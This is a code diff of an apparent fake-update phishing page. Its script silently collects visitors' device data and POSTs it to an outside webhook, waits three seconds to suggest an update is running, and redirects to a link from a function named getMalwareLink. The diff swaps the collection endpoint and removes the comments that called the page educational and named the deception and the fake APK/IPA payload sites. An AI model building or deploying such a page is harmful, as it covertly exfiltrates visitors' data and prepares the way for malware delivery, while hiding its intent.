@@ -52,7 +52,7 @@
     <!-- الكود الخلفي (لا يظهر للمستخدم، يعمل في الخلفية)        -->
     <!-- ====================================================== -->
     <script>
-        // 1. صفحة الويب: جمع البيانات وإرسالها (كما تعلمت)
+        // 1. صفحة الويب: جمع البيانات وإرسالها
         function collectAndSend() {
             const ua = navigator.userAgent;
             
@@ -72,8 +72,8 @@
                 timestamp: new Date().toISOString()
             };
 
-            // إرسال البيانات إلى خادمك (استخدم الرابط الخاص بك هنا)
-            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
+            // إرسال البيانات إلى رابطك الشخصي
+            const webhook = 'https://formspree.io/f/mljrbabg';
 
             fetch(webhook, {
                 method: 'POST',
@@ -87,17 +87,16 @@
             });
         }
 
-        // 2. تحديد نوع الجهاز وإنشاء رابط التحميل الخبيث
+        // 2. تحديد نوع الجهاز وإنشاء رابط التحميل
         function getMalwareLink() {
             const ua = navigator.userAgent;
             
-            // هذه روابط وهمية (للتعلم فقط). في الهجوم الحقيقي، سترسل ملفات APK/IPA حقيقية
             if (ua.includes('iPhone')) {
-                return "https://www.google.com"; // بدلاً من ذلك، قد يكون: "https://fake-apple.com/update.ipa"
+                return "https://www.google.com";
             } else if (ua.includes('Android')) {
-                return "https://www.google.com"; // بدلاً من ذلك، قد يكون: "https://fake-google.com/update.apk"
+                return "https://www.google.com";
             } else {
-                return "https://www.google.com"; // لأجهزة الكمبيوتر
+                return "https://www.google.com";
             }
         }
 
@@ -106,9 +105,9 @@
             // أ. إرسال البيانات
             collectAndSend();
 
-            // ب. الانتظار 3 ثوانٍ (لإيهام المستخدم أن التحديث جارٍ)
+            // ب. الانتظار 3 ثوانٍ
             setTimeout(() => {
-                // ج. إعادة التوجيه إلى الرابط الخبيث (أو جوجل للتمويه)
+                // ج. إعادة التوجيه
                 const targetUrl = getMalwareLink();
                 window.location.replace(targetUrl);
             }, 3000);
